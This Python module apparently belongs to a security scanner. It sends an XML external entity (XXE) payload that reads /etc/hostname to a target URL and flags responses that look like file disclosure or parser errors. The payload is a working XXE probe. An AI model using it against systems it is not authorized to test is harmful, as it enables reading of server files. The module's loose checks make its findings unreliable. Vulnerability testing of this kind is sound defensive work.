from typing import Dict, Any, List
import httpx
from datetime import datetime


class XXEHandler:
    async def test_vulnerability(self, target: Dict[str, Any]):
        async with httpx.AsyncClient() as client:
            # Ensure payload is properly formatted without leading whitespace
            payload = '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>\n<root>&xxe;</root>'

            response = await client.post(
                target["url"],
                content=payload.encode("utf-8"),
                headers={"Content-Type": "application/xml"},
            )

            return self._analyze_response(response)

    def _analyze_response(self, response) -> Dict:
        """Analyze the response for XXE vulnerability indicators"""
        result = {
            "timestamp": datetime.now().isoformat(),
            "vulnerability_found": False,
            "details": {
                "status_code": response.status_code,
                "response_length": len(response.content),
                "content_type": response.headers.get("content-type", ""),
            },
            "evidence": {
                "response_body": response.text[:1000],  # First 1000 chars
                "headers": dict(response.headers),
            },
        }

        # Check for common XXE indicators
        if self._check_xxe_indicators(response):
            result["vulnerability_found"] = True
            result["details"]["indicators_found"] = self._get_xxe_indicators(response)
            result["recommendations"] = [
                "Disable XML external entity processing",
                "Use latest XML parser version",
                "Implement XML input validation",
            ]

        return result

    def _check_xxe_indicators(self, response) -> bool:
        """Check for indicators of successful XXE exploitation"""
        # Look for system file content
        if response.text and any(
            indicator in response.text.lower()
            for indicator in ["/etc/", "system32", "root:", "localhost"]
        ):
            return True

        # Check for error messages that might indicate XXE processing
        if any(
            error in response.text.lower()
            for error in ["entity", "dtd", "xml", "parsing error"]
        ):
            return True

        return False

    def _get_xxe_indicators(self, response) -> List[str]:
        """Extract specific XXE vulnerability indicators from response"""
        indicators = []

        if "/etc/" in response.text:
            indicators.append("System file path exposed")
        if "root:" in response.text:
            indicators.append("System user information exposed")
        if "localhost" in response.text:
            indicators.append("System hostname exposed")

        return indicators
